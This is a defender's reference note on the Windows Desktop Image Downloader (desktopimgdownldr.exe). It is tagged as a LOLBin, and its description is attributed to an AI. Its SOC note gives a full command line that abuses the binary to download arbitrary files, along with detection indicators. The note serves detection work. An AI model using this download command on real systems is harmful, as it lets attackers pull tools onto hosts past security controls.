---
created: 2026-11-21
fullpath: 'c:\windows\system32\desktopimgdownldr.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - executable
  - lolbin
aliases:
  - desktopimgdownldr.exe
url:
---

**fullpath**:c:\windows\system32\desktopimgdownldr.exe

# description

_Not documented on Microsoft Learn at 2026/11/21 07:12 UTC_

## simple description

> ### 2026-11-21 Claude said
> desktopimgdownldr.exe is the Windows Desktop Image Downloader, used by the Personalization CSP to download and set desktop and lock-screen images defined by policy. It fetches an image from a URL and stores it under the personalization folder. It normally runs only when an MDM or policy sets a background image.
>
> **SOC NOTE**: A known LOLBin: `desktopimgdownldr.exe /lockscreenurl:https://host/file /eventName:desktopimgdownldr` (often with `SYSTEMROOT` set to a writable folder) downloads arbitrary files (T1105 Ingress Tool Transfer). Any execution outside MDM context, especially with a modified SYSTEMROOT, is suspicious; it can also leave a `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP` entry and files in the BITS/personalization folders.
> _Not documented on Microsoft Learn at 2026/11/21 07:12 UTC_

# purpose

_Not documented on Microsoft Learn at 2026/11/21 07:12 UTC_

# typical use cases

_Not documented on Microsoft Learn at 2026/11/21 07:12 UTC_

# options

_Not documented on Microsoft Learn at 2026/11/21 07:12 UTC_
